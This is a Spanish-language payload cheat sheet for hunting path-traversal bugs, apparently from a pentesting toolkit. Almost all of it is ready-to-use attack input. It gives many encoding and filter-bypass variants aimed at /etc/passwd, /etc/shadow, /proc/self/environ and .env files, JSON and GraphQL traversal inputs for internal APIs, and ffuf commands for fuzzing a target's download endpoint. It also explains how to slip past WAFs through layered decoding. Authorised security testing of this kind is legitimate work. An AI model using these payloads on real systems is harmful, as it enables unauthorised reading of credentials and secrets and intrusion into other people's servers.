# Payloads — hunt-path-traversal

Carga condicional: leer solo cuando hay señal de filtro activo (bare
`../` bloqueado o respuesta idéntica al baseline inválido).

## Bare (siempre probar primero)
```
../../../etc/passwd
../../../etc/shadow
../../../proc/self/environ
../../../../.env
```

## URL encoding simple
```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
..%2f..%2f..%2fetc%2fpasswd
```

## Double encoding (para WAFs que decodifican una sola vez)
```
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
%252e%252e%252f..%252fetc%252fpasswd
```

## Mixed slashes (Windows, parsers tolerantes)
```
..\..\..\etc\passwd
..\\..\\.\\etc\\passwd
..\/..\/..\/etc\/passwd
```

## Dotless traversal
```
....//....//....//etc/passwd
....\/....\/....\/etc/passwd
```

## Null byte (PHP < 5.3.4, algunos C legacy)
```
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd%00.pdf
```

## Extension bypass (cuando el server valida extensión pero no el path completo)
```
../../../etc/passwd.jpg    # si el server no valida la extensión real
../../../.env%00.csv       # null byte antes de la extensión esperada
```

## Overlong UTF-8 (legacy)
```
%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```

## Internal API traversal (Primitivo 3)
```json
// En body JSON, donde user_id construye ruta interna
{"user_id": "../../admin/roles", "username": "poc"}
{"user_id": "../../config/secrets", "action": "get"}

// En GraphQL
query { readFile(path: "../../../.env") }
query { getDocument(name: "../../admin/users") }
```

## Fuzzing con ffuf
```bash
# Wordlist de traversal de Wfuzz (ya en SecLists)
ffuf -u "https://$TARGET/download?file=FUZZ" \
  -w $SECLISTS_PATH/Fuzzing/LFI/LFI-Jhaddix.txt \
  -fc 403 -rate 3 -t 1

# Filtrar por tamaño distinto al baseline (soft-404)
ffuf -u "https://$TARGET/download?file=FUZZ" \
  -w payloads.txt \
  -fs $BASELINE_SIZE -rate 3 -t 1
```

## Nota sobre multi-layer decode

Si hay Nginx → Node.js → Python en el stack, un payload puede pasar
por múltiples decodings. Probar:
1. Encode simple (un layer)
2. Double encode (dos layers)
3. Mix: bare `..` con encode en el `/` solamente (`..%2f..%2fetc/passwd`)

El punto donde se decodifica en cada layer determina si el filtro
del layer anterior ve el payload crudo o ya decodificado.
